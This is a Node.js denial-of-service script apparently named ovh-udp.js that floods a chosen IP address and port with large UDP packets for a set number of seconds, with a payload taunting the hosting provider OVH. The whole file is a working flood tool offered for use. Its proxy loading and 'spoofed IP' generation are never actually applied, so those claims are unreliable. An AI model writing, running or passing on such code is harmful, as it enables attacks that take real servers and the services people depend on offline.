// credits : andrax L4 Flood
const dgram = require("dgram");
const fs = require("fs");

if (process.argv.length < 5) {
    console.log("Usage: node ovh-udp.js <IP_TARGET> <PORT_TARGET> <TIME>");
    process.exit(1);
}

const targetIp = process.argv[2];
const targetPort = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]) * 1000;
const startTime = Date.now();

const packetSize = 65500;
const packetsPerThread = 50000;
const threads = 8;

const proxies = fs.existsSync("Soks.txt") ? fs.readFileSync("Soks.txt", "utf8").split("\n").map(p => p.trim()).filter(Boolean) : [];

if (proxies.length === 0) {
    console.log("No proxies found, sending direct packets...");
}

console.log(`Starting UDP flood to ${targetIp}:${targetPort} for ${process.argv[4]} seconds...`);
console.log(`Threads: ${threads} | Packet Size: ${packetSize} bytes | Packets per Thread: ${packetsPerThread}`);

function generateSpoofedIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

function sendUdpFlood() {
    if (Date.now() - startTime > duration) {
        console.log("Attack finished.");
        process.exit(0);
    }

    const socket = dgram.createSocket("udp4");
    const packet = Buffer.alloc(packetSize, "BYE BYE OVH GETOUT");

    for (let i = 0; i < packetsPerThread; i++) {
        let spoofedIP = generateSpoofedIP();
        socket.send(packet, 0, packet.length, targetPort, targetIp, () => {});
    }

    socket.close();
    setTimeout(sendUdpFlood, 10);
}

for (let i = 0; i < threads; i++) {
    sendUdpFlood();
}